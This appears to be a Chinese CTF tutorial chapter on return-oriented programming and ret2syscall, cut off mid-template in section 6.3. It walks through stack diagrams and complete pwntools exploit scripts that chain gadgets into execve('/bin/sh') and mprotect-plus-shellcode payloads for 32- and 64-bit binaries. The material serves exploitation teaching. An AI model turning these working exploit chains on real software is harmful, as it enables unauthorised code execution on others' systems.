# 04 ret2syscall 与 ROP 入门

> 前置阅读：[02-ret2text](02-ret2text.md)、[03-ret2shellcode](03-ret2shellcode.md)。本章正式引入 ROP（Return-Oriented Programming，面向返回的编程），并用它完成最经典的利用目标：`execve("/bin/sh", 0, 0)` 拿 shell。

## 本章速览

| 小节 | 主题 | 一句话要点 |
|:---:|:---|:---|
| 1 | ROP 思想入门 | `ret` 会不断上滑 rsp，把栈上的地址串成一条"滑链" |
| 2 | 系统调用基础 | `int 0x80`（32 位）与 `syscall`（64 位）的调用号与传参对照 |
| 3 | 32 位 ret2syscall | pop eax/ebx/ecx/edx + int 0x80 拼 execve 链（完整栈图 + exp） |
| 4 | 64 位 ret2syscall | pop rdi/rsi/rdx/rax + syscall；缺 gadget 用 `__libc_csu_init` |
| 5 | 没有 "/bin/sh" | gadget 写内存 / read 读入 / 复用已有字符串，三种方案 |
| 6 | mprotect + shellcode | 静态题 NX 开启：改页权限 → 读 shellcode → 跳过去（32/64 双模板） |
| 7 | syscall 泄露 libc | write(1, &got, n) 泄露后转 05 章 ret2libc |
| 8 | 栈空间不足 | 精简 gadget、分段 ROP 接力、返回 vuln 二次溢出、栈迁移概述 |
| 9 | 变体与扩展 | argv/envp 细节、栈平衡、int 0x80 去哪找、动态链接情形 |
| 10 | 典型例题 x3 | 32 位经典题 / 64 位 pop 链题 / mprotect+shellcode 题 |
| 11 | 常见坑 | --depth、寄存器顺序、调用号位数、段权限、时序 |
| 12 | 检查清单 | 学完自测 |

**学习目标**：理解 ROP 滑链机制；熟练使用 ROPgadget/ropper；独立完成 32/64 位 ret2syscall；掌握 "/bin/sh" 缺失与 mprotect 两个必会变体。

---

## 1. ROP 思想入门

### 1.1 为什么需要 ROP

回顾前两章：

- ret2text：跳到程序里现成的后门函数 `getshell()` —— 可惜大多数题没有后门
- ret2shellcode：把机器码写进栈再跳过去执行 —— 可惜 NX（栈不可执行）一开就废

NX 开启后，栈/堆/数据段都不能执行代码，但**代码段里现成的指令依然可以执行**。程序（尤其是静态编译的二进制）里散落着大量以 `ret` 结尾的短指令序列，比如 `pop rdi; ret`、`syscall; ret`。每个这样的片段称为一个 **gadget**（代码小工具）。

ROP 的思想一句话：**不注入代码，只复用代码**。把栈溢出的返回地址位置及其后面的一片栈空间，排布成「gadget 地址 + 参数 + gadget 地址 + 参数 + ……」的序列，让程序一路 `ret` 着滑下去——等价于"用现成指令片段写了一小段程序"。这套机制图灵完备，理论上想干什么都行。

### 1.2 ret 指令的"滑链"机制

先复习 `ret` 的语义（x86/x64 通用）：

```asm
ret   ; 等价于 pop rip（32 位为 pop eip）
      ; 1. 从 rsp 指向的栈单元取出一个地址，送入指令指针
      ; 2. rsp 上移一个字长（64 位 +8，32 位 +4）
      ; 3. CPU 跳到该地址继续执行
```

如果取出来的地址指向 `pop rdi ; ret`：

1. `pop rdi`：把当前栈顶的值弹进 rdi（这正是我们预先放在栈上的"参数"），rsp 再上移一格
2. `ret`：把新的栈顶（我们放的下一个 gadget 地址）送入 rip
3. CPU 跳到下一个 gadget，重复上述过程

于是，栈上只要按顺序排好「gadget 地址、参数、gadget 地址、参数……」，控制流就像坐滑梯一样一路执行下去，直到链尾。这就是"滑链"。

64 位示例栈图（假设 offset 已知，`binsh` 为 "/bin/sh" 的地址）：

```text
            栈（从低地址到高地址；rsp 随每次 ret 增大，图中自上而下逐格滑动）
            低地址
 rsp 起点-->+--------------------------+
            | 'A' * offset （填充）     |   溢出：把 saved RIP 及以下全部覆盖
            +--------------------------+
   第1跳    | pop rdi ; ret            |   第一次 ret 落在这里
            +--------------------------+
            | binsh                    |   pop rdi 弹走 => rdi = &"/bin/sh"
            +--------------------------+
   第2跳    | pop rax ; ret            |   第二次 ret 落在这里
            +--------------------------+
            | 59                       |   pop rax 弹走 => rax = 59 (execve)
            +--------------------------+
   第3跳    | syscall                  |   第三次 ret 落在这里 => 开炮
            +--------------------------+
            高地址
```

逐跳跟踪表：

| 步骤 | rsp 指向 | 执行的指令 | 效果 |
|:---:|:---|:---|:---|
| 1 | 填充区末尾（saved RIP 位） | ret | rip = `pop rdi; ret` 的地址，rsp+8 |
| 2 | `binsh` 那格 | pop rdi | rdi = binsh，rsp+8 |
| 3 | `pop rax` 那格 | ret | rip = `pop rax; ret` 的地址，rsp+8 |
| 4 | `59` 那格 | pop rax | rax = 59，rsp+8 |
| 5 | `syscall` 那格 | ret | rip = syscall，rsp+8 |
| 6 | 下一格 | syscall | 触发 execve("/bin/sh", ...) |

要点：

- **每个以 ret 结尾的 gadget 都是链上的一节**；`pop x; ret` 型 gadget 同时完成"取参数"与"跳下一段"两件事
- 栈上参数必须**紧跟在消费它的 gadget 后面**，顺序绝对不能乱
- 32 位同理，只是每格 4 字节、寄存器换成 eax/ebx/ecx/edx
- 链尾通常是一次 syscall（getshell）、一个函数调用，或者一条 `ret` 回溢出点的"接力棒"（见第 8 节）

### 1.3 gadget 分类学

| 类型 | 典型形态 | 用途 | 出现频率 |
|:---|:---|:---|:---:|
| 取值 | `pop rdi ; ret` | 给寄存器塞参数/调用号 | 极高 |
| 组合取值 | `pop rsi ; pop r15 ; ret` | 同上，多弹一个填充位 | 高 |
| 写内存 | `mov qword ptr [rax], rdx ; ret` | 任意地址写（自己造 "/bin/sh"） | 中 |
| 交换 | `xchg eax, esp ; ret` | rsp 与寄存器互换（栈迁移） | 低 |
| 调栈 | `add rsp, 0x18 ; ret` / `pop rsp ; ret` | 跳过/搬移 rsp | 中 |
| 迁栈 | `leave ; ret` | rsp = rbp + 8（栈迁移经典） | 高 |
| 系统调用(64) | `syscall ; ret` | 执行系统调用并继续滑链 | 静态题高 |
| 系统调用(32) | `int 0x80 ; ret` | 同上（32 位） | 静态题高 |
| 清栈 | `add esp, 8 ; ret` | 32 位跳过栈上数据 | 中 |
| 函数调用 | `mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call [r12+rbx*8]` | csu：一次控三参并调用任意函数 | 静态/老程序 |

两条经验：

- **越长越稀有**：`pop rdx; ret` 在 64 位程序里出了名地难找（编译器很少生成这个序列），常常要靠 csu gadget 或 libc 救场
- **别只盯着 pop**：`mov [x], y`、`xchg`、`add rsp` 这些"功能型"gadget，才是把 ROP 从"调个函数"升级成"写段程序"的关键

### 1.4 工具：让机器替你翻指令

人工在 objdump 输出里翻 gadget 效率极低，实战都用自动搜索工具（2.4、2.5 详述）：

- **ROPgadget**：Python 编写，功能全，支持 `--depth/--only/--string` 等过滤
- **ropper**：指令解码器与 ROPgadget 不同，常能搜到对方漏掉的，两者互补
- **pwntools ROP 类**：`rop.find_gadget(['pop rdi', 'ret'])`，写 exp 时最顺手

---

## 2. 系统调用基础

### 2.0 什么是系统调用

用户态代码没有权限直接碰硬件/文件/进程，需要请内核代劳，这个入口就是系统调用。getshell 的本质，就是让内核替我们执行一次 `execve("/bin/sh", 0, 0)`，把当前进程整个替换成 shell。

触发方式因位数而异：32 位走软中断 `int 0x80`，64 位用专用指令 `syscall`。ROP 里我们不需要自己写这两条指令，而是**把程序里现成的它们的地址排进链里**。

### 2.1 int 0x80（32 位约定）

```asm
; 32 位系统调用模板
mov eax, 11        ; 调用号：execve
mov ebx, path      ; 第 1 参数
mov ecx, 0         ; 第 2 参数 (argv)
mov edx, 0         ; 第 3 参数 (envp)
int 0x80           ; 软中断陷入内核
```

| 项目 | 寄存器 |
|:---|:---|
| 调用号 | eax |
| 第 1~5 参数 | ebx, ecx, edx, esi, edi |
| 返回值 | eax（负数为 -errno） |

注意：32 位普通函数（CDECL）前三个参数走**栈**，但**系统调用**走 ebx/ecx/edx 寄存器，顺序恰好是 ebx→ecx→edx——背的时候别和 64 位的 rdi/rsi/rdx 混了。

### 2.2 syscall（64 位约定）

```asm
; 64 位系统调用模板
mov rax, 59        ; 调用号：execve
mov rdi, path      ; 第 1 参数
mov rsi, 0         ; 第 2 参数
mov rdx, 0         ; 第 3 参数
syscall            ; 陷入内核（专用指令，比中断快）
```

| 项目 | 寄存器 |
|:---|:---|
| 调用号 | rax |
| 第 1~6 参数 | rdi, rsi, rdx, **r10**, r8, r9 |
| 返回值 | rax |
| 副作用 | rcx 被写入返回地址、r11 被写入 rflags（链上后面还要用这两个寄存器就必须重设） |

特别注意第 4 参数是 **r10 而不是 rcx**（rcx 被 syscall 指令自身征用），这是与函数调用 System V 约定的著名差异点。

### 2.3 常用调用号对照表（背下来）

| 功能 | 32 位 (eax) | 64 位 (rax) | 32 位参数序 | 64 位参数序 |
|:---|:---:|:---:|:---|:---|
| read | **3** | **0** | ebx=fd, ecx=buf, edx=len | rdi=fd, rsi=buf, rdx=len |
| write | **4** | **1** | ebx=fd, ecx=buf, edx=len | rdi=fd, rsi=buf, rdx=len |
| open | **5** | **2** | ebx=path, ecx=flags, edx=mode | rdi=path, rsi=flags, rdx=mode |
| close | 6 | 3 | ebx=fd | rdi=fd |
| execve | **11** | **59** | ebx=path, ecx=argv, edx=envp | rdi=path, rsi=argv, rdx=envp |
| chdir | 12 | 80 | ebx=path | rdi=path |
| exit | 1 | 60 | ebx=code | rdi=code |
| mprotect | **125** | **10** | ebx=addr, ecx=len, edx=prot | rdi=addr, rsi=len, rdx=prot |
| openat | 295 | 257 | ebx=dirfd, ecx=path, ... | rdi=dirfd, rsi=path, ... |
| mmap | 90（mmap2 为 192） | 9 | — | rdi=addr, rsi=len, rdx=prot, r10=flags |

加粗的是 ROP 高频调用号。**32 位和 64 位的编号完全是两套**（read: 3 vs 0，execve: 11 vs 59，mprotect: 125 vs 10），背混必翻车——这是 ret2syscall 第一大坑（详见 11.3）。

### 2.4 ROPgadget 实战

```bash
# 安装
pip install ropgadget

# 全量列出（结果巨长，建议重定向到文件慢慢 grep）
ROPgadget --binary ./pwn > gadgets.txt

# 按指令过滤：--only 只保留含这些助记符的 gadget
ROPgadget --binary ./pwn --only "pop|ret"
ROPgadget --binary ./pwn --only "mov|ret" | grep "qword ptr \["
ROPgadget --binary ./pwn --only "syscall|ret"     # 64 位找 syscall
ROPgadget --binary ./pwn --only "int"             # 32 位找 int 0x80

# 直接搜字符串（找 "/bin/sh"）
ROPgadget --binary ./pwn --string "/bin/sh"

# 深度：一条 gadget 最多包含几条指令，默认 10
# 找不到想要的 gadget 时加大到 15/20 再试
ROPgadget --binary ./pwn --depth 15 --only "pop|ret"

# 也可以对 libc 单独搜（动态题需要先 leak 基址）
ROPgadget --binary libc.so.6 --only "pop|ret" | grep ": pop rdi ; ret"
```

输出示例（每行 = gadget 地址 : 指令序列）：

```text
0x000000000040173f : pop rdi ; ret
0x000000000040173d : pop rsi ; pop r15 ; ret
0x00000000004017a2 : syscall ; ret
```

### 2.5 ropper 用法

```bash
# 列出全部 gadget
ropper --file ./pwn

# 搜索：支持 % 通配单个字符
ropper --file ./pwn --search "pop rdi"
ropper --file ./pwn --search "% pop rdi"       # 允许前面夹一条别的指令
ropper --file ./pwn --search "syscall"

# 搜索字符串
ropper --file ./pwn --string "/bin/sh"

# 指定深度/段
ropper --file ./pwn --depth 15
ropper --file ./pwn --section .text
```

两个工具的指令解码器不同，**搜不到时换另一个再搜一遍**是标准操作。

### 2.6 pwntools 一条龙（写 exp 时最顺手）

```python
from pwn import *
elf = ELF('./pwn')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]     # 返回 (地址,) 元组，取 [0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]
binsh   = next(elf.search(b'/bin/sh\x00'))           # 在数据里搜字符串地址
bss     = elf.bss()                                  # 可写段地址

# 简单场景甚至能自动拼链：
rop.call(elf.plt['read'], [0, bss, 8])               # 自动找参数 gadget 并布局
print(rop.dump())
```

---

## 3. 核心目标：execve("/bin/sh", 0, 0)

### 3.1 execve 语义

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

- 用 pathname 指定的程序**替换当前进程**，成功则永不返回（所以链尾不用再补 exit）
- `argv`（参数指针数组）与 `envp`（环境变量指针数组）**直接传 NULL 即可**，Linux 允许
- 换成寄存器语言就是：eax/rax = 11/59，另外两个参数寄存器全塞 0

### 3.2 情形一：32 位静态编译题

**利用条件**：

- 程序**静态链接**：主程序里就有全部 gadget、`int 0x80` 和 "/bin/sh"，无需任何 leak
- NX 开启：不能上 shellcode，正好用 ROP（静态题 NX 默认开）
- 无 canary（或已绕过）、无 PIE（或已知基址）
- 存在可控溢出点（gets/read/scanf 等）

**第一步：找原料。**

```bash
$ checksec --file=./ret2syscall
    Arch:    i386-32-little
    NX:      NX enabled
    Stack:   No canary found
    PIE:     No PIE (0x8048000)

$ ROPgadget --binary ret2syscall --only "pop|ret" | grep ": pop eax ; ret"
0x080bb196 : pop eax ; ret
$ ROPgadget --binary ret2syscall --only "pop|ret" | grep ": pop e[cbd]x"
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
$ ROPgadget --binary ret2syscall --only "int"
0x08049421 : int 0x80
$ ROPgadget --binary ret2syscall --string "/bin/sh"
[+] Gadget found: 0x080be408 : "/bin/sh"
```

原料清单：

| 原料 | 地址 | 用途 |
|:---|:---|:---|
| `pop eax ; ret` | 0x080bb196 | eax = 11 |
| `pop edx ; pop ecx ; pop ebx ; ret` | 0x0806eb90 | 一次控制三个参数寄存器 |
| `int 0x80` | 0x08049421 | 触发系统调用 |
| "/bin/sh" | 0x080be408 | ebx 的实参 |

**第二步：拼链（完整栈图）。**

先定 offset（填充长度）：`cyclic(200)` 打过去，gdb/核心转储里看 EIP 落在哪串字符上，`cyclic -l 0x6161616x` 得到 112。

```text
      低地址
      +-----------------------------+ <== buf 起点
      |        'A' * 112            |   填充：盖住 buf + saved EBP
      +-----------------------------+
rsp-->| 0x080bb196  pop eax ; ret   |   saved EIP 位：第一次 ret 落点
      +-----------------------------+
      | 0xb                         |   pop eax 弹走 => eax = 11 (execve)
      +-----------------------------+
      | 0x0806eb90  pop edx;ecx;ebx |   第二次 ret 落点
      +-----------------------------+
      | 0                           |   第 1 弹 => edx = 0 (envp)
      +-----------------------------+
      | 0                           |   第 2 弹 => ecx = 0 (argv)
      +-----------------------------+
      | 0x080be408                  |   第 3 弹 => ebx = &"/bin/sh"
      +-----------------------------+
      | 0x08049421  int 0x80        |   第三次 ret 落点 => 触发 execve
      +-----------------------------+
      高地址
```

弹出顺序 = 栈上排列顺序：`pop edx ; pop ecx ; pop ebx` 会依次弹走紧随其后的三格，所以 **edx 的值必须放在最前面**。这正是新手把参数排反的高发区（坑 11.2）。

**第三步：完整 exp。**

```python
from pwn import *

# ---- 环境声明：32 位 ----
context(arch='i386', os='linux', log_level='info')

p   = process('./ret2syscall')
# p = remote('node.example.com', 10001)          # 打远程时替换
elf = ELF('./ret2syscall')

# ---- 收集原料（地址来自 ROPgadget 实测，换成你自己二进制里的） ----
pop_eax = 0x080bb196                            # pop eax ; ret
pop_3   = 0x0806eb90                            # pop edx ; pop ecx ; pop ebx ; ret
int_80  = 0x08049421                            # int 0x80（execve 成功即不返回，可无 ret）
bin_sh  = next(elf.search(b'/bin/sh\x00'))      # 0x080be408

# ---- 拼链：与上面栈图逐格对应 ----
payload  = b'A' * 112                           # 填充到 saved EIP（cyclic 实测）
payload += p32(pop_eax)                         # ret -> pop eax
payload += p32(11)                              # eax = 11 = execve（32 位调用号！）
payload += p32(pop_3)                           # ret -> pop edx; pop ecx; pop ebx
payload += p32(0)                               # 第 1 弹 -> edx = envp = NULL
payload += p32(0)                               # 第 2 弹 -> ecx = argv = NULL
payload += p32(bin_sh)                          # 第 3 弹 -> ebx = pathname
payload += p32(int_80)                          # ret -> int 0x80，开炮

# ---- 发送 ----
p.sendlineafter(b'Input\n', payload)
p.interactive()                                 # 已经是 shell，随便敲命令
```

若 execve 失败（沙箱/路径问题），int 0x80 会把 -errno 返回在 eax 里，程序继续往下跑——通常表现为崩溃而不是 getshell。看到崩溃先怀疑调用号与参数顺序。

### 3.3 备用模板：三个独立 pop

找不到三连 pop 时，用三个单 pop 各自上值（链更长，但更通用）：

```python
payload  = b'A' * 112
payload += p32(pop_edx) + p32(0)        # edx = envp = NULL
payload += p32(pop_ecx) + p32(0)        # ecx = argv = NULL
payload += p32(pop_ebx) + p32(bin_sh)   # ebx = pathname
payload += p32(pop_eax) + p32(11)       # eax = 调用号
payload += p32(int_80)                  # 触发系统调用
```

每个参数紧跟自己的 gadget，谁先 pop 谁在栈上靠前——这段骨架建议直接背下来。

---
## 4. 情形二：64 位 ret2syscall

### 4.1 标准链形

64 位参数全走寄存器（rdi/rsi/rdx），调用号放 rax。理想 gadget 组合：

| gadget | 用途 | 备注 |
|:---|:---|:---|
| `pop rdi ; ret` | rdi = pathname | 几乎必有 |
| `pop rsi ; ret` | rsi = argv | 老程序常见变体 `pop rsi ; pop r15 ; ret` |
| `pop rdx ; ret` | rdx = envp | 出了名地稀缺，见 4.3 |
| `pop rax ; ret` | rax = 59 | 几乎必有 |
| `syscall ; ret` | 开炮 | 静态程序几乎必有 |

**利用条件**：同 3.2，仅位数与调用号不同（59 而不是 11）。

完整栈图（设 offset = 136）：

```text
      低地址
      +------------------------------+
      |        'A' * 136             |   填充到 saved RIP
      +------------------------------+
rsp-->| pop rdi ; ret                |   第 1 跳
      +------------------------------+
      | &"/bin/sh"                   |   => rdi = pathname
      +------------------------------+
      | pop rsi ; pop r15 ; ret      |   第 2 跳
      +------------------------------+
      | 0                            |   => rsi = 0 (argv)
      +------------------------------+
      | 0                            |   r15 吃掉的填充位（不垫它链就错位了）
      +------------------------------+
      | pop rdx ; ret                |   第 3 跳
      +------------------------------+
      | 0                            |   => rdx = 0 (envp)
      +------------------------------+
      | pop rax ; ret                |   第 4 跳
      +------------------------------+
      | 59                           |   => rax = 59 (execve，64 位调用号)
      +------------------------------+
      | syscall ; ret                |   第 5 跳 => 开炮
      +------------------------------+
      高地址
```

**完整 exp（64 位）：**

```python
from pwn import *

# ---- 环境声明：64 位 ----
context(arch='amd64', os='linux', log_level='info')

p   = process('./ret2syscall_x64')
elf = ELF('./ret2syscall_x64')

# ---- 收集原料（地址来自 ROPgadget 实测） ----
pop_rdi = 0x000000000040173f        # pop rdi ; ret
pop_rsi = 0x000000000040173d        # pop rsi ; pop r15 ; ret
pop_rdx = 0x0000000000401741        # pop rdx ; ret
pop_rax = 0x0000000000402d1c        # pop rax ; ret
syscall = 0x00000000004017a2        # syscall ; ret
bin_sh  = next(elf.search(b'/bin/sh\x00'))

# ---- 拼链 ----
payload  = b'A' * 136               # offset 用 cyclic 实测
payload += p64(pop_rdi) + p64(bin_sh)          # rdi = "/bin/sh"
payload += p64(pop_rsi) + p64(0) + p64(0)      # rsi = 0；多弹的 r15 垫一个 0
payload += p64(pop_rdx) + p64(0)               # rdx = 0
payload += p64(pop_rax) + p64(59)              # rax = 59 = execve（64 位调用号！）
payload += p64(syscall)                        # 开炮

p.sendlineafter(b'>> ', payload)
p.interactive()
```

### 4.2 `syscall ; ret` 与裸 `syscall` 的区别

- `syscall ; ret`：最理想，系统调用返回后继续滑链，支持多段系统调用连招（mprotect、read、write 串联）
- 裸 `syscall`：后面跟着什么指令不确定。用在 execve（成功即不返回）没问题；用作中间步骤（如 read）时，必须 `objdump` 检查它到下一条 ret 之间的指令没有破坏现场的副作用
- 静态程序里 `syscall` 指令海量（每个 libc 封装函数里都有），`syscall ; ret` 也几乎必有：

```bash
ROPgadget --binary ./pwn --only "syscall|ret"
```

### 4.3 gadget 缺失：__libc_csu_init 通用 gadget（概述）

编译器给每个程序生成的启动函数 `__libc_csu_init` 里固定藏着两段黄金 gadget：

```asm
; G1（csu_pop）：一次吃掉 6 个栈值，控制 4 个寄存器
pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

; G2（csu_call）：把 r13/r14/r15 搬进 rdx/rsi/edi，再按指针调用函数
mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12 + rbx*8]
```

一次能设置 rdx、rsi、edi 三个参数并调用任意地址的函数——专治 `pop rdx` 缺失。注意事项：

- G2 尾部还有 `add rsp, 8 ; pop rbx ; pop rbp ; pop r12~r15 ; ret`，两段可以首尾相接循环使用（"两段式 csu 链"）
- 有的编译器变体是 `mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d`，以实际反汇编为准
- glibc 2.34+ 已删除 `__libc_csu_init`，新题需换用 `__libc_start_call_main` 附近的 gadget 等替代品

两段式完整推导、csu 调用 GOT 函数、2.34 之后的替代方案，统一放在 **07-ROP高级技巧**，本章记住"缺 rdx 先想 csu"即可。

### 4.4 其他缺失的补充手段速查

| 缺什么 | 补救 |
|:---|:---|
| pop rdx | csu gadget / libc 里找 / `mov edx, x` 型 gadget |
| pop rsi | `pop rsi ; pop r15` 变体 / csu / libc |
| pop rax | `mov eax, 0xb` 型（零扩展特性，见 11.3） |
| syscall | 去 libc.so.6 里找（需先 leak 基址，05 章） |
| "/bin/sh" | 见第 5 节 |

---

## 5. 没有 "/bin/sh" 字符串怎么办

先确认真的没有：

```bash
strings -t x ./pwn | grep -E "/bin/sh|/bin//sh|/bin/bash|/bin/dash"
python3 -c "from pwn import *; print(next(ELF('./pwn').search(b'/bin/sh')))"
```

都没有时，三条路按可靠度排序。

### 5.1 方案一：写内存 gadget 手搓 "/bin/sh"

**原理**：找 `mov qword ptr [reg], reg ; ret`（64 位一次写 8 字节）或 32 位的 `mov dword ptr [reg], reg ; ret`（一次写 4 字节），把字符串写进 .bss 等可写段，再让 execve 的第一个参数指向那里。这是"功能型 gadget"最典型的应用：寄存器是笔，内存是纸。

**利用条件**：存在"写内存"gadget + 能控制两个寄存器（目标地址 + 数据）+ 可写段地址已知（无 PIE 或已 leak）。

搜索命令：

```bash
ROPgadget --binary ./pwn --only "mov|ret" | grep "qword ptr \[r"    # 64 位
ROPgadget --binary ./pwn --only "mov|ret" | grep "dword ptr \[e"    # 32 位
```

**64 位模板**（8 字节一次写完，用 "//bin/sh\0" 正好 8 字节——多一个斜杠无碍）：

```python
from pwn import *
context(arch='amd64', os='linux')

p   = process('./pwn')
elf = ELF('./pwn')
rop = ROP(elf)

pop_rax  = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdx  = rop.find_gadget(['pop rdx', 'ret'])[0]
pop_rdi  = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi  = rop.find_gadget(['pop rsi', 'ret'])[0]
syscall  = rop.find_gadget(['syscall', 'ret'])[0]
mov_q    = 0x401234                  # mov qword ptr [rax], rdx ; ret
bss      = elf.bss(0x800)            # 挑一块远离运行时数据的 .bss 空地

payload  = b'A' * offset
# ---- 第一步：把 "//bin/sh\0" 写到 bss ----
payload += p64(pop_rax) + p64(bss)                    # rax = 目标地址
payload += p64(pop_rdx) + p64(u64(b'//bin/sh\x00'))   # rdx = 字符串本体
payload += p64(mov_q)                                 # 内存[bss] = "//bin/sh"
# ---- 第二步：execve(bss, 0, 0) ----
payload += p64(pop_rdi) + p64(bss)                    # rdi = 刚写好的字符串
payload += p64(pop_rsi) + p64(0) + p64(0)             # rsi = 0
payload += p64(pop_rax) + p64(59)
payload += p64(syscall)

p.sendlineafter(b'>> ', payload)
p.interactive()
```

**32 位模板**（4 字节一次，分两半写 "/bin" 与 "/sh\0"）：

```python
from pwn import *
context(arch='i386', os='linux')

# pop_eax/pop_ebx/mov_w 地址从 ROPgadget 搜出
pop_eax   = 0x080xxxxx    # pop eax ; ret
pop_ebx   = 0x080xxxxx    # pop ebx ; ret
mov_w     = 0x080xxxxx    # mov dword ptr [eax], ebx ; ret
bss = elf.bss(0x400)

payload  = b'A' * 112
# 写前 4 字节 "/bin"
payload += p32(pop_ebx) + p32(u32(b'/bin'))    # ebx = 数据
payload += p32(pop_eax) + p32(bss)             # eax = 目标地址
payload += p32(mov_w)                          # [bss] = "/bin"
# 写后 4 字节 "/sh\0"
payload += p32(pop_ebx) + p32(u32(b'/sh\x00'))
payload += p32(pop_eax) + p32(bss + 4)         # 地址 +4，接着上次的位置
payload += p32(mov_w)                          # [bss+4] = "/sh\0"
# execve(bss, 0, 0)
payload += p32(pop_ebx) + p32(bss)
payload += p32(pop_ecx) + p32(0)
payload += p32(pop_edx) + p32(0)
payload += p32(pop_eax) + p32(11)
payload += p32(int_80)
```

**常见坑**：`mov [reg], reg` 与 `ret` 之间往往还挂着别的指令（如 `mov [rax], rdx ; nop ; ret` 没事；但 `mov [rax], rdx ; mov rbx, [rax] ; ret` 这类带读副作用的要看场景）。用 ROPgadget 看完整指令序列再决定用不用。

### 5.2 方案二：read 读入 "/bin/sh"

**原理**：与其手搓，不如让程序自己把字符串读进内存——先调一次 `read(0, bss, 8)` 把 "/bin/sh\0" 从 stdin 写进 bss，再执行 execve 链。能调 `read@plt`（动态题）或拼 read 系统调用（静态题）都行。

**利用条件**：能触发 read（plt 或 syscall gadget）；bss 地址已知；exp 里注意两段数据的发送时序（第二段要等链跑到 read 才发）。

**64 位模板（走系统调用）：**

```python
payload  = b'A' * offset
# ---- read(0, bss, 8)：rdi=0, rsi=bss, rdx=8, rax=0 ----
payload += p64(pop_rdi) + p64(0)               # fd = stdin
payload += p64(pop_rsi) + p64(bss) + p64(0)    # buf = bss（r15 垫 0）
payload += p64(pop_rdx) + p64(8)               # len = 8
payload += p64(pop_rax) + p64(0)               # read 的 64 位调用号是 0，不是 3！
payload += p64(syscall)                        # 链卡在这里等 stdin
# ---- execve(bss, 0, 0)：rdi=bss, rax=59 ----
payload += p64(pop_rdi) + p64(bss)             # read 返回值占了 rax，必须重设（见 9.2）
payload += p64(pop_rax) + p64(59)
payload += p64(syscall)

p.sendlineafter(b'>> ', payload)
p.send(b'/bin/sh\x00')      # 此刻链正卡在 read 上；用 send 别 sendline，别早发
p.interactive()
```

**32 位模板（走 int 0x80）：**

```python
# 注意：中段链要求 int 0x80 后能继续滑，优先找 int 0x80 ; ret（见 6.5）
int_80 = 0x080xxxxx    # int 0x80 ; ret

payload  = b'A' * 112
# read(0, bss, 8)：eax=3（32 位 read！）, ebx=0, ecx=bss, edx=8
payload += p32(pop_eax) + p32(3)
payload += p32(pop_ebx) + p32(0)      # fd
payload += p32(pop_ecx) + p32(bss)    # buf
payload += p32(pop_edx) + p32(8)      # len
payload += p32(int_80)                # 卡在 read 等输入
# execve(bss, 0, 0)：eax=11
payload += p32(pop_eax) + p32(11)     # eax 被 read 返回值污染，重新 pop
payload += p32(pop_ebx) + p32(bss)
payload += p32(pop_ecx) + p32(0)
payload += p32(pop_edx) + p32(0)
payload += p32(int_80)

p.sendlineafter(b'Input\n', payload)
p.send(b'/bin/sh\x00')
```

read 的调用号：32 位是 3，64 位是 0——又见 11.3。

### 5.3 方案三：复用已有的字符串

- 找**完整可执行路径串**：很多二进制里有 "/bin/bash"、"/bin/dash"，`execve("/bin/bash", 0, 0)` 一样 getshell
- 找**短串 "sh"**：注意 `execve` 是按路径解析的、**不走 PATH**，相对路径 "sh" 相对**进程 cwd** 解释，仅当 cwd 下真有名为 sh 的可执行文件才行。可用 chdir 系统调用接力：先 `chdir("/bin")`（eax/rax = 12/80），再 `execve("sh", 0, 0)`——这是"只有 sh 碎片"时的经典正解
- 动态链接题里 **libc 必有 "/bin/sh"**：leak 出基址后直接用（05 章标准姿势）
- 搜字符串时要确保以 `\0` 结尾：`next(elf.search(b'/bin/sh\x00'))`、`next(elf.search(b'sh\x00'))`；短串容易撞上 "bash"、"push" 的中段，务必核对上下文

---

## 6. NX 静态题进阶：mprotect + shellcode

### 6.1 原理

静态题 gadget 丰富，但有时偏偏缺一两个 pop（最常见是 32 位缺 ecx、64 位缺 rdx）拼不出 execve。此时换一条路：**把一段内存改成可执行，把 shellcode 读进去，跳过去执行**。相当于给 NX 绕道：NX 说"栈不能执行"，那我们给 bss 办一张"执行许可证"。

三步链：

1. `mprotect(page, 0x1000, 7)`：把 bss 所在页改成 RWX（prot=7 = R|W|X）
2. `read(0, page, N)`：从 stdin 把 shellcode 读进该页
3. `ret` 到 page：执行 shellcode

```text
      低地址
      +------------------------------+
rsp-->| pop rdi ; ret                |--+
      | page                         |  |  1) mprotect(page, 0x1000, 7)
      | pop rsi ; ret                |  |     rax=10, rdi=page, rsi=0x1000, rdx=7
      | 0x1000                       |  |
      | pop rdx ; ret                |  |
      | 7                            |  |
      | pop rax ; ret                |  |
      | 10                           |  |     mprotect 64 位调用号 = 10
      | syscall ; ret                |--+
      | pop rdi ; ret                |  |  2) read(0, page, 0x100)
      | 0                            |  |     rax=0, rdi=0, rsi=page, rdx=0x100
      | pop rsi ; ret                |  |
      | page                         |  |
      | pop rdx ; ret                |  |
      | 0x100                        |  |
      | pop rax ; ret                |  |
      | 0                            |  |     read 64 位调用号 = 0
      | syscall ; ret                |--+
      | page                         |  |  3) ret 到 page => 执行读入的 shellcode
      +------------------------------+
      高地址
```

### 6.2 对齐与参数

- addr 必须是 **0x1000 对齐**的页地址，否则 mprotect 返回 EINVAL（不报错、静默失败，最后跳过去直接崩）。用 `page = elf.bss() & ~0xfff` 现算，别手抄 writeup 的地址
- len 传 0x1000（一整页）即可；prot=7
- shellcode 别超长：`asm(shellcraft.sh())` 一般不到 0x30 字节，随便塞

**利用条件**：能控制 rdi/rsi/rdx/rax（32 位为 ebx/ecx/edx/eax）四个寄存器 + syscall/int 0x80 gadget + 一段已知地址的可写内存 + 溢出空间装得下这条长链（装不下见第 8 节）。

### 6.3 64 位完整模板

```python
from pwn import *
context(arch='amd64', os='linux', log_level='info')

p   = process('./mpx64')
elf = ELF('./mpx64')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
